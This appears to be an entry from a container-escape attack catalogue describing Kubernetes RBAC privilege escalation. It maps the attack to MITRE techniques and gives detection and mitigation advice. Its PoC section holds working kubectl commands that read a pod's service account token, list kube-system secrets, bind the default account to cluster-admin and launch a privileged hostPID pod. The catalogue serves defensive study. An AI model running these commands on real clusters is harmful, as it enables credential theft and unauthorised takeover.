---
id: CE-003
name: Kubernetes RBAC escalation
category: orchestration/rbac
mitre_attack: [T1078, T1611]
risk: critical
detection_rules: [SIGMA-010]
---

# CE-003 — Kubernetes RBAC escalation

## Summary

The most common "escape" is not a kernel exploit — it is an over-permissive
Role or ClusterRole. A compromised pod's service account token (or a stolen
kubeconfig) with `get/list secrets`, `create pods`, `bind`, or `impersonate`
verbs can reach cluster-admin in a handful of API calls.

## Prerequisites

- A service account token or kubeconfig with permissive RBAC grants
- API server reachable from the pod (default)

## Attack path

1. Read the SA token and CA from `/var/run/secrets/kubernetes.io/serviceaccount/`
2. Enumerate permissions: `kubectl auth can-i --list`
3. **Secrets:** list secrets in kube-system → steal other SA tokens → lateral move
4. **Pods:** create a privileged pod on the target node (then CE-007/CE-010)
5. **Impersonate:** `--as=system:masters` if `impersonate` is granted
6. **Bind:** create a ClusterRoleBinding to bind your own SA to cluster-admin

## PoC sketch

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# what can I do?
kubectl --token="$TOKEN" --certificate-authority="$CA" \
  -s "$APISERVER" auth can-i --list

# secrets path
kubectl --token="$TOKEN" -s "$APISERVER" -n kube-system get secrets

# bind path (if granted)
kubectl --token="$TOKEN" -s "$APISERVER" create clusterrolebinding pwn \
  --clusterrole=cluster-admin --serviceaccount=default:default

# privileged pod path (if granted)
kubectl --token="$TOKEN" -s "$APISERVER" apply -f - <<'EOF'
apiVersion: v1
kind: Pod
metadata: {name: pwn, namespace: kube-system}
spec:
  hostPID: true
  containers:
    - {name: pwn, image: ubuntu, command: ["sleep", "infinity"],
       securityContext: {privileged: true}}
EOF
```

## Detection

- **Logs:** API server audit logs — watch `verb=bind`, `impersonate`,
  `secrets` list from non-control-plane sources; RBAC-change events
- **Sigma:** `SIGMA-010` — privileged pod creation via audit log
- **Tooling:** `admission-review` (this corpus), Kubescape, Kubeaudit,
  RBAC-Buster (attack-side mapping)

## Mitigation

- Least-privilege RBAC; no default-SA automount
- Deny `bind`/`impersonate`/`escalate` except for controllers
- PodSecurity Standards: `restricted` namespace policy
- Audit `create pods` with privileged spec via admission controller (Kyverno/OPA)

## References

- Kubernetes RBAC documentation
- MITRE ATT&CK T1078 (Valid Accounts), T1611
